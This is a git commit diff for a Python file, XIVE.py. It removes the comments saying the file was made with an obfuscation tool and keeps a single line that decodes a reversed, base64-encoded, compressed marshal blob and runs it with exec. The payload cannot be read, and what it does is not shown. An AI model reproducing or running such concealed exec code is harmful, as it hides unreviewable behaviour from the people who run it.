3e8ec7bfbde2ce0c1fc8e90f5d864b7fb936a2da
xive7 <mdahnaf094@gmail.com>
2025-11-24 09:30:15 +0600

    Update XIVE.py

--- XIVE.py
+++ XIVE.py
@@ -1,5 +1,1 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Mon Nov 24 09:26:09 2025
-# -------------------------------
 _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=InIWzFAUAqNikuBVR+giIfQdOHzVDcy4CZZeLjMzAjPkYALQBsxbAg4rUbSNnyTNnMsi3N2UtdM/paQfyQl4j/nXBz/gAIgHjH+e2SxkhQuxsIfJfa5gcFMPjA+4jvrtMuJmCylm3kJKZoR5ADAAXmYOXZDcVmSUiAyFjxyQOMmCDpwQ6MmQWxs6DFTCAkZLxJe'))
